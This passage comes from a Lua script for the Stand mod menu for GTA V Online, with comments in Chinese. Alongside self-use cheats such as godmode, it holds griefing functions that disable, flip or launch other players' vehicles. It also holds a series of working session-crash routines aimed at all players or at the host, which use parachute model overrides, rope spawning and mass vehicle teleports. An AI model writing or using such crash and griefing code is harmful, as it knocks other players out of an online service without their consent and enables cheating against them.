                local currentpos = players.get_position(pid)
                if v3.distance(oldpos, currentpos) > 500 and oldpos.x ~= currentpos.x and oldpos.y ~= currentpos.y and oldpos.z ~= currentpos.z then
                    util.toast(players.get_name(pid) .. " 刚刚进行了传送")
                end
            end
        end
    end
end
--切换模型检测
function changedMOD_detection()
    if NETWORK.NETWORK_IS_SESSION_STARTED() then
        for _, pid in ipairs(players.list(true, true, true)) do
            local ped =  PLAYER.GET_PLAYER_PED(pid)
            local name = PLAYER.GET_PLAYER_NAME(pid)
            local module = ENTITY.GET_ENTITY_MODEL(ped)

            if not table_find(modder_list, pid) and module ~= -1667301416 and module ~= 1885233650 then
                modder_list[#modder_list] = pid
                util.toast(name .. " 改变了人物模型")
            end
        end
    end
end




----部分载具功能
--引擎控制
function toggle_player_vehicle_engine(pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    local player_ped = PLAYER.GET_PLAYER_PED(pid)
    local player_vehicle = PED.GET_VEHICLE_PED_IS_IN(player_ped, false)
    if player_vehicle == 0 then
        util.toast(players.get_name(pid) .. "不在车里:D")
    else
        local is_running = VEHICLE.GET_IS_VEHICLE_ENGINE_RUNNING(player_vehicle)
        if request_control(player_vehicle, 3) then
            VEHICLE.SET_VEHICLE_ENGINE_ON(player_vehicle, not is_running, true, true)
            util.toast(players.get_name(pid) .. "发动机已切换")
        else
            util.toast("无法控制车辆.")
        end
    end
end
--摧毁引擎
function break_player_vehicle_engine(pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    local player_ped = PLAYER.GET_PLAYER_PED(pid)
    local player_vehicle = PED.GET_VEHICLE_PED_IS_IN(player_ped, false)
    if player_vehicle == 0 then
        util.toast(players.get_name(pid) .. "不在车里:D")
    else
        if request_control(player_vehicle, 3) then
            VEHICLE.SET_VEHICLE_ENGINE_HEALTH(player_vehicle, -10.0)
            util.toast(players.get_name(pid) .. "他的引擎坏了")
        else
            util.toast("无法控制他们的车辆")
        end
    end
end
--向前推进
function boost_player_vehicle_forward(pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    local player_ped = PLAYER.GET_PLAYER_PED(pid)
    local player_vehicle = PED.GET_VEHICLE_PED_IS_IN(player_ped, false)
    if player_vehicle == 0 then
        util.toast(players.get_name(pid) .. "不在车里:D")
    else
        request_control(player_vehicle, 3)
        ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(player_vehicle, 1, 0.0, 1000.0, 0.0, true, true, true, true)
        util.toast(players.get_name(pid) .. "车辆猛冲")
    end
end
--停止车辆
function stop_player_vehicle(pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    local player_ped = PLAYER.GET_PLAYER_PED(pid)
    local player_vehicle = PED.GET_VEHICLE_PED_IS_IN(player_ped, false)
    if player_vehicle == 0 then
        util.toast(players.get_name(pid) .. "不在车里:D")
    else
        request_control(player_vehicle, 3)
        VEHICLE.BRING_VEHICLE_TO_HALT(player_vehicle, 0.0, 1, false)
        util.toast(players.get_name(pid) .. "车辆停止")
    end
end
--倒置车辆
function flip_player_vehicle(pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    local player_ped = PLAYER.GET_PLAYER_PED(pid)
    local player_vehicle = PED.GET_VEHICLE_PED_IS_IN(player_ped, false)
    if player_vehicle == 0 then
        util.toast(players.get_name(pid) .. "不在车里:D")
    else
        request_control(player_vehicle, 3)
        local heading = ENTITY.GET_ENTITY_HEADING(player_vehicle)
        ENTITY.SET_ENTITY_ROTATION(player_vehicle, 0, 180, -heading, 1, true)
        util.toast(players.get_name(pid) .. "车辆翻转")
    end
end
--车辆翻转180度
function turn_player_vehicle(pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    local player_ped = PLAYER.GET_PLAYER_PED(pid)
    local player_vehicle = PED.GET_VEHICLE_PED_IS_IN(player_ped, false)
    if player_vehicle == 0 then
        util.toast(players.get_name(pid) .. "不在车里:D")
    else
        request_control(player_vehicle, 3)
        local heading = ENTITY.GET_ENTITY_HEADING(player_vehicle)
        local alter_heading = heading >= 180 and heading-180 or heading+180
        ENTITY.SET_ENTITY_ROTATION(player_vehicle, 0, 0, alter_heading, 2, true)
        util.toast(players.get_name(pid) .. "车辆转弯")
    end
end
--修复载具
function repair_vehicle(pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    local vehicle = PED.GET_VEHICLE_PED_IS_IN(PLAYER.GET_PLAYER_PED(pid), false)
    request_control(vehicle, 3)
    VEHICLE.SET_VEHICLE_FIXED(vehicle)
    VEHICLE.SET_VEHICLE_DEFORMATION_FIXED(vehicle)
    VEHICLE.SET_VEHICLE_ENGINE_HEALTH(vehicle, 1000.0)
    --GRAPHICS.REMOVE_PARTICLE_FX_FROM_ENTITY(vehicle)
end
--载具无敌
function veh_godmode(toggled)
    veh_godmode_toggled = toggled
    while veh_godmode_toggled do
        local vehicle = PED.GET_VEHICLE_PED_IS_IN(PLAYER.PLAYER_PED_ID(), false)
        ENTITY.SET_ENTITY_INVINCIBLE(vehicle, true)
        ENTITY.SET_ENTITY_PROOFS(vehicle, true, true, true, true, true, true, true, true)
        util.yield()
    end
    local vehicle = PED.GET_VEHICLE_PED_IS_IN(PLAYER.PLAYER_PED_ID(), false)
    ENTITY.SET_ENTITY_INVINCIBLE(vehicle, false)
    ENTITY.SET_ENTITY_PROOFS(vehicle, false, false, false, false, false, false, false, false)
end
-----弹飞载具
function launch_up_player_vehicle(pid)
    local player_ped = PLAYER.GET_PLAYER_PED(pid)
    local player_vehicle = PED.GET_VEHICLE_PED_IS_IN(player_ped, false)
    if player_vehicle == 0 then
        util.toast(players.get_name(pid) .. " 不在车中:D")
    else
        if request_control(player_vehicle, 3) then
            ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(player_vehicle, 1, 0.0, 0.0, 1000.0, true, true, true, true)
            util.toast(players.get_name(pid) .. "'已发射.")
        else
            util.toast("无法控制车辆")
        end
    end
end

----鬼畜载具
function Demon_veh(pid, toggle)
    glitchVeh = toggle
    local ped = PLAYER.GET_PLAYER_PED(pid)
    local pos = ENTITY.GET_ENTITY_COORDS(ped, false)
    local player_veh = PED.GET_VEHICLE_PED_IS_USING(ped)
    local veh_model = players.get_vehicle_model(pid)
    local ped_hash = util.joaat("a_m_m_acult_01")
    local object_hash = util.joaat("prop_ld_ferris_wheel")
    request_model(ped_hash)
    request_model(object_hash)
    
    while glitchVeh do
        if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
        if v3.distance(ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), false), players.get_position(pid)) > 1000.0 and v3.distance(pos, players.get_cam_pos(PLAYER.PLAYER_ID())) > 1000.0 then
            util.toast("距离玩家太远了:/")
            menu.set_value(glitchVehCmd, false);
            break 
        end
        if not PED.IS_PED_IN_VEHICLE(ped, player_veh, false) then 
            util.toast("玩家不在车里")
            menu.set_value(glitchVehCmd, false);
            break 
        end
        if not VEHICLE.ARE_ANY_VEHICLE_SEATS_FREE(player_veh) then
            util.toast("车上没空位了")
            menu.set_value(glitchVehCmd, false);
            break 
        end
        local seat_count = VEHICLE.GET_VEHICLE_MODEL_NUMBER_OF_SEATS(veh_model)
        local glitch_obj = entities.create_object(object_hash, pos)
        local glitched_ped = entities.create_ped(26, ped_hash, pos, 0)
        local things = {glitched_ped, glitch_obj}
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(glitch_obj)
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(glitched_ped)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(glitch_obj, glitched_ped, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true, 0)
        for i, spawned_objects in ipairs(things) do
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(spawned_objects)
            ENTITY.SET_ENTITY_VISIBLE(spawned_objects, false)
            ENTITY.SET_ENTITY_INVINCIBLE(spawned_objects, true)
        end
        for i = 0, seat_count -1 do
            if VEHICLE.ARE_ANY_VEHICLE_SEATS_FREE(player_veh) then
                local emptyseat = i
                for l = 1, 25 do
                    PED.SET_PED_INTO_VEHICLE(glitched_ped, player_veh, emptyseat)
                    ENTITY.SET_ENTITY_COLLISION(glitch_obj, true, true)
                    util.yield()
                end
            end
        end
        if glitched_ped ~= nil then
            delete_entity(glitched_ped) 
        end
        if glitch_obj ~= nil then 
            delete_entity(glitch_obj)
        end
    end
end




--喇叭加速
function horn_boost(pid)
    local ped = PLAYER.GET_PLAYER_PED(pid)
    local veh = PED.GET_VEHICLE_PED_IS_IN(ped, false)
    request_control(veh, 3)
    VEHICLE.SET_VEHICLE_MOD(veh, 14, - 1, false)
    if AUDIO.IS_HORN_ACTIVE(veh) then
        VEHICLE.SET_VEHICLE_ALARM(veh, false)
        ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(veh, 1, 0.0, 1.0, 0.0, true, true, true, true)
    end
end
---喇叭跳跳车
function car_jump(pid)
    local ped = PLAYER.GET_PLAYER_PED(pid)
    local veh = PED.GET_VEHICLE_PED_IS_IN(ped, false)
    request_control(veh, 3)
    VEHICLE.SET_VEHICLE_MOD(veh, 14, - 1, false)
    if AUDIO.IS_HORN_ACTIVE(veh) then
        ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(veh, 1, 0.0, 0.0, 0.7, true, true, true, true) -- alternatively, VEHICLE.SET_VEHICLE_FORWARD_SPEED(...) -- not tested
    end
end




----驾驶最近的载具
function drive_closest_vehicle()
    local closestveh = get_closest_vehicle(PLAYER.PLAYER_PED_ID(), 1000000)
    local driver = VEHICLE.GET_PED_IN_VEHICLE_SEAT(closestveh, -1)
    if VEHICLE.IS_VEHICLE_SEAT_FREE(closestveh, -1) then
        PED.SET_PED_INTO_VEHICLE(PLAYER.PLAYER_PED_ID(), closestveh, -1)
    else
        if not PED.IS_PED_A_PLAYER(driver) then
            delete_entity(driver)
            PED.SET_PED_INTO_VEHICLE(PLAYER.PLAYER_PED_ID(), closestveh, -1)
        elseif VEHICLE.ARE_ANY_VEHICLE_SEATS_FREE(closestveh) then
            for i = 0, 10 do
                if VEHICLE.IS_VEHICLE_SEAT_FREE(closestveh, i) then
                    PED.SET_PED_INTO_VEHICLE(PLAYER.PLAYER_PED_ID(), closestveh, i)
                    break
                end
            end
        else
            util.toast("传送到最近车辆错误")
        end
    end
end
---喇叭传送
function horn_tp(toggled)
    horn_boost_tpd = toggled
    if horn_boost_tpd then
        local msg = "按 ~%s~ 使用传送"
        util.show_corner_help(msg:format("INPUT_VEH_HORN"))
        while horn_boost_tpd do
            --绘制连线
            local closestveh = get_closest_vehicle(PLAYER.PLAYER_PED_ID(), 1000000)
            draw_line_entity_to_entity(PLAYER.PLAYER_PED_ID(), closestveh, {r = 0, g = 0 , b = 255, a = 255})

            if PAD.IS_CONTROL_PRESSED(0, 46) then
                drive_closest_vehicle()
                util.yield(200)
            end
            util.yield()
        end
    end
end

----军演阅兵
function parade()
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID())
    --飞机创建坐标
    local planep = {}
    planep[1] = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.PLAYER_PED_ID(), 0, -500, 100)
    planep[2] = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.PLAYER_PED_ID(), -10, -520, 100)
    planep[3] = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.PLAYER_PED_ID(), 10, -520, 100)
    planep[4] = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.PLAYER_PED_ID(), -20, -540, 100)
    planep[5] = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.PLAYER_PED_ID(), 0, -540, 100)
    planep[6] = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.PLAYER_PED_ID(), 20, -540, 100)

    --飞机目标位置
    local end_pos = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.PLAYER_PED_ID(), 0, 5000, 100)
    local Military_Target = create_object(1082797888, end_pos.x, end_pos.y, end_pos.z)--目标物体
    ENTITY.SET_ENTITY_COLLISION(Military_Target, false, false)
    --创建飞机and驾驶员
    local planet = {}
    local drivet = {}
    for i = 1, 6 do
        planet[i] = create_vehicle(util.joaat("Lazer"), planep[i].x, planep[i].y, planep[i].z, ENTITY.GET_ENTITY_HEADING(PLAYER.PLAYER_PED_ID()))
        ENTITY.SET_ENTITY_INVINCIBLE(planet[i],true)
        ENTITY.SET_ENTITY_COLLISION(planet[i], false, true)
        drivet[i] = PED.CREATE_RANDOM_PED_AS_DRIVER(planet[i], 1)
        VEHICLE.SET_VEHICLE_ENGINE_ON(planet[i], true, true, 0)
    end

    --领头飞机光标
    local blip = HUD.ADD_BLIP_FOR_ENTITY(planet[1])
    HUD.SET_BLIP_COLOUR(blip, 5)

    --创建6种颜色
    local colors = {}
    for i = 1, 6 do
        colors[i] = {r=math.random(0, 255) / 255, g=math.random(0, 255) / 255, b=math.random(0, 255) / 255}
    end
    --创建定时器
    local parade_timer = newTimer()
    while true do

        --控制飞机路径和速度
        for i = 1, 6 do
            VEHICLE.SET_VEHICLE_FORWARD_SPEED(planet[i], 200 / 3.6)
            set_entity_face_entity(planet[i], Military_Target, true)

            request_ptfx_asset("scr_rcpaparazzo1")
            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_ON_ENTITY("scr_mich4_firework_sparkle_spawn", planet[i], 0.0, -9.0, 0.0, 0.0, 0.0, 0.0, 20.0, false, false, false)
            GRAPHICS.SET_PARTICLE_FX_NON_LOOPED_COLOUR(colors[i].r, colors[i].g, colors[i].b)
        end

        local disa = ENTITY.GET_ENTITY_COORDS(planet[1])
        local disb = ENTITY.GET_ENTITY_COORDS(Military_Target)
        local distance = Get_distance(disa, disb, false)
        if distance < 4500 then
            for i = 1, 6 do
                delete_entity(planet[i])
                delete_entity(drivet[i])
            end
            delete_entity(Military_Target)
            break
        end
        util.yield()
    end
end


----无敌
function invincible_self(toggled)
    invin_toggle = toggled
    while invin_toggle do
        PLAYER.SET_PLAYER_INVINCIBLE(PLAYER.PLAYER_PED_ID(), true)
        util.yield()
    end
    PLAYER.SET_PLAYER_INVINCIBLE(PLAYER.PLAYER_PED_ID(), false)
end
----禁用摔倒
function disable_ragdoll(toggled)
    ragdoll_toggle = toggled
    while ragdoll_toggle do
        PED.SET_PED_CAN_RAGDOLL(PLAYER.PLAYER_PED_ID(), false)
        util.yield()
    end
    PED.SET_PED_CAN_RAGDOLL(PLAYER.PLAYER_PED_ID(), true)
end

----安全带
function seat_belt(toggled)
    seatbelt = toggled
    while seatbelt do
        PED.SET_PED_CONFIG_FLAG(PLAYER.PLAYER_PED_ID(), 32, false)
        PED.SET_PED_CAN_BE_KNOCKED_OFF_VEHICLE(PLAYER.PLAYER_PED_ID(), 1)
        util.yield()
    end
    PED.SET_PED_CONFIG_FLAG(PLAYER.PLAYER_PED_ID(), 32, true)
    PED.SET_PED_CAN_BE_KNOCKED_OFF_VEHICLE(PLAYER.PLAYER_PED_ID(), 0)
end

----推伞
function push_parachute(toggled)
    push_parachute_toggled = toggled
    while push_parachute_toggled do
        if PAD.IS_CONTROL_PRESSED(0, 22) then
            TASK.SET_PARACHUTE_TASK_THRUST(PLAYER.PLAYER_PED_ID(), 1)
        else
            TASK.SET_PARACHUTE_TASK_THRUST(PLAYER.PLAYER_PED_ID(), 0)
        end
        util.yield()
    end
    TASK.SET_PARACHUTE_TASK_THRUST(PLAYER.PLAYER_PED_ID(), 0)
end

----玩家自检
function is_player_modder(pid)
    local suffix = players.is_marked_as_modder(pid) and "已触发作弊者检测" or " 尚未触发作弊者检测"
    chat.send_message(players.get_name(pid) .. suffix, true, true, false)
end


----同步时间
function Real_world_time()
    local setClockCommand = menu.ref_by_path('World>Atmosphere>Clock>Time', 37)
    menu.trigger_command(setClockCommand, os.date('%H:%M:%S'))
    local smoothTransitionCommand = menu.ref_by_path('World>Atmosphere>Clock>Smooth Transition', 37)
    if menu.get_value(smoothTransitionCommand) then 
		menu.trigger_command(smoothTransitionCommand) 
    end
end


----全局电磁脉冲
function veh_EMP()
    for k, pid in pairs(players.list(true, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED(pid)
        local coords = ENTITY.GET_ENTITY_COORDS(ped, true)
        FIRE.ADD_EXPLOSION(coords['x'], coords['y'], coords['z'], 65, 999, false, true, 0)
    end
end 


----加速垫
function jiasudian(pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    local coords = players.get_position(pid)
    coords.z = coords.z - 0.3
    local player = PLAYER.GET_PLAYER_PED(pid)
    local heading = ENTITY.GET_ENTITY_HEADING(player)
    heading = heading + 80
    local boostpad = entities.create_object(3287988974, coords)
    ENTITY.SET_ENTITY_HEADING(boostpad, heading)
end
function sigejiasudian(pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    local coords = players.get_position(pid)
    coords.z = coords.z - 0.3
    local player = PLAYER.GET_PLAYER_PED(pid)
    local heading = ENTITY.GET_ENTITY_HEADING(player)
    local boostpad = entities.create_object(-388593496, coords)
    ENTITY.SET_ENTITY_HEADING(boostpad, heading)
end
function jiansudai(pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    local coords = players.get_position(pid)
    coords.z = coords.z - 0.6
    local player = PLAYER.GET_PLAYER_PED(pid)
    local heading = ENTITY.GET_ENTITY_HEADING(player)
    heading = heading + 80
    local boostpad = entities.create_object(-227275508, coords)
    ENTITY.SET_ENTITY_HEADING(boostpad, heading)
end


----载具伞崩全局
function veh_ubl_carsh()
    local Pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), true)
    for pid = 0, 31 do
        local mypos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), true)
        local TargetPlayerPed = PLAYER.GET_PLAYER_PED(pid)
        local Ruiner2 = create_vehicle(util.joaat("Ruiner2"), mypos.x, mypos.y, mypos.z, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
        PED.SET_PED_INTO_VEHICLE(PLAYER.PLAYER_PED_ID(), Ruiner2, -1)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Ruiner2, mypos.x, mypos.y, 1000, false, true, true)
        util.yield(200)
        VEHICLE1._SET_VEHICLE_PARACHUTE_MODEL(Ruiner2, util.joaat("prop_beach_parasol_05"))
        VEHICLE1._SET_VEHICLE_PARACHUTE_ACTIVE(Ruiner2, true)
        util.yield(200)
        delete_entity(Ruiner2)
    end
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PLAYER.PLAYER_PED_ID(), Pos.x, Pos.y, Pos.z, false, true, true)
end

---主机崩
function hostcrash(pid)
    local self_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID())
    menu.trigger_commands("tpmazehelipad")
    ENTITY.SET_ENTITY_COORDS(self_ped, -6170, 10837, 40, true, false, false)
    util.yield(1000)
    menu.trigger_commands("tpmazehelipad")
end
----人物伞崩V1
function ped_ubl_crashv1()
    local SelfPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID())
    local PreviousPlayerPos = ENTITY.GET_ENTITY_COORDS(SelfPlayerPed, true)
    for n = 0 , 3 do
        local object_hash = util.joaat("prop_logpile_06b")
        request_model(object_hash)
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),object_hash)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, 0,0,500, false, true, true)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(SelfPlayerPed, 0xFBAB5776, 1000, false)
        util.yield(1000)
        for i = 0 , 20 do
            PED.FORCE_PED_TO_OPEN_PARACHUTE(SelfPlayerPed)
        end
        util.yield(1000)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, PreviousPlayerPos.x, PreviousPlayerPos.y, PreviousPlayerPos.z, false, true, true)

        local object_hash2 = util.joaat("prop_beach_parasol_03")
        request_model(object_hash2)
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),object_hash2)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, 0,0,500, 0, 0, 1)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(SelfPlayerPed, 0xFBAB5776, 1000, false)
        util.yield(1000)
        for i = 0 , 20 do
            PED.FORCE_PED_TO_OPEN_PARACHUTE(SelfPlayerPed)
        end
        util.yield(1000)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, PreviousPlayerPos.x, PreviousPlayerPos.y, PreviousPlayerPos.z, false, true, true)
    end
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, PreviousPlayerPos.x, PreviousPlayerPos.y, PreviousPlayerPos.z, false, true, true)
end
----人物伞崩V2
function ped_ubl_crashv2()
    for n = 0 , 5 do
        PEDP = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID())
        local object_hash = 1381105889
        request_model(object_hash)
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),object_hash)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, 0,0,500, 0, 0, 1)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
        util.yield(1000)
        for i = 0 , 20 do
            PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
        end
        util.yield(1000)
        menu.trigger_commands("tplsia")
        local bush_hash = 720581693
        request_model(bush_hash)
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),bush_hash)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, 0,0,500, 0, 0, 1)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
           util.yield(1000)
        for i = 0 , 20 do
            PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
        end
        util.yield(1000)
        menu.trigger_commands("tplsia")
    end
end
----人物伞崩V3
function ped_ubl_crashv3()
    for n = 0 , 5 do
        PEDP = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID())
        local object_hash = 192829538
        request_model(object_hash)
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),object_hash)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, 0,0,500, 0, 0, 1)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
        util.yield(1000)
        for i = 0 , 20 do
            PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
        end
        util.yield(1000)
        menu.trigger_commands("tplsia")
        local bush_hash = 192829538
        request_model(bush_hash)
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),bush_hash)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, 0,0,500, 0, 0, 1)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
           util.yield(1000)
        for i = 0 , 20 do
            PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
        end
        util.yield(1000)
        menu.trigger_commands("tplsia")
    end
end
----人物伞崩V4
function ped_ubl_crashv4()
    for n = 0 , 5 do
        PEDP = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID())
        local object_hash = 1117917059
        request_model(object_hash)
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),object_hash)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, 0,0,500, 0, 0, 1)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
        util.yield(1000)
        for i = 0 , 20 do
            PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
        end
        util.yield(1000)
        menu.trigger_commands("tplsia")
        local bush_hash = 1117917059
        request_model(bush_hash)
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),bush_hash)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, 0,0,500, 0, 0, 1)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
           util.yield(1000)
        for i = 0 , 20 do
            PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
        end
        util.yield(1000)
        menu.trigger_commands("tplsia")
    end
end
----懂哥崩溃
function dongge_crash()
    for pid = 0, 31 do
        PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),0xE5022D03)
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID()))
        util.yield(20)
        local p_pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid))
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID()),p_pos.x,p_pos.y,p_pos.z,false,true,true)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID()), 0xFBAB5776, 1000, false)
        TASK.TASK_PARACHUTE_TO_TARGET(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID()),-1087,-3012,13.94)
        util.yield(500)
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID()))
        util.yield(1000)
        PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(PLAYER.PLAYER_ID())
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID()))
    end
end
-----全局顶崩
function unknown()
    for pid = 0, 32 do
        local spped = PLAYER.PLAYER_PED_ID()
        local SelfPlayerPos = ENTITY.GET_ENTITY_COORDS(spped, true)
        local TTPed = PLAYER.GET_PLAYER_PED(pid)
        local TTPos = ENTITY.GET_ENTITY_COORDS(TTPed, true)
        SelfPlayerPos.x = SelfPlayerPos.x + 10
        TTPos.x = TTPos.x + 10
        local carc = create_object(util.joaat("apa_prop_flag_china"), TTPos.x, TTPos.y, TTPos.z)
        local carcPos = ENTITY.GET_ENTITY_COORDS(carc, true)
        local pedc = create_ped(26, util.joaat("A_C_HEN"), TTPos.x, TTPos.y, TTPos.z, 0)
        local pedcPos = ENTITY.GET_ENTITY_COORDS(carc, true)
        local ropec = PHYSICS.ADD_ROPE(TTPos.x, TTPos.y, TTPos.z, 0.0, 0.0, 0.0, 1.0, 1, 0.00300000000000000000000000000000000000000000000001, 1, 1, true, true, true, 1.0, true, 0)
        PHYSICS.ATTACH_ENTITIES_TO_ROPE(ropec,carc,pedc,carcPos.x, carcPos.y, carcPos.z ,pedcPos.x, pedcPos.y, pedcPos.z,2, false, false, 0, 0, "Center","Center")
        util.yield(3500)
        PHYSICS.DELETE_CHILD_ROPE(ropec)
        delete_entity(pedc)
    end
end
----5G崩溃
function G5_crash()
    for pid = 0, 31 do
        local TPP = PLAYER.GET_PLAYER_PED(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(TPP, true)
        pos.z = pos.z + 10
        local veh = entities.get_all_vehicles_as_handles()
        for i = 1, #veh do
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh[i])
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh[i], pos.x,pos.y,pos.z, ENTITY.GET_ENTITY_HEADING(TPP), 10)
            TASK.TASK_VEHICLE_TEMP_ACTION(TPP, veh[i], 18, 999)
            TASK.TASK_VEHICLE_TEMP_ACTION(TPP, veh[i], 16, 999)
        end
    end
end
----冷战崩溃
function shiver_crash()
    for n = 0 , 5 do
        PEDP = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID())
        local object_hash = 1117917059
        request_model(object_hash)
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),object_hash)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, 0,0,500, 0, 0, 1)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
        util.yield(1000)
        for i = 0 , 20 do
            PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
        end
        util.yield(1000)
        menu.trigger_commands("tplsia")
        local bush_hash = -908104950
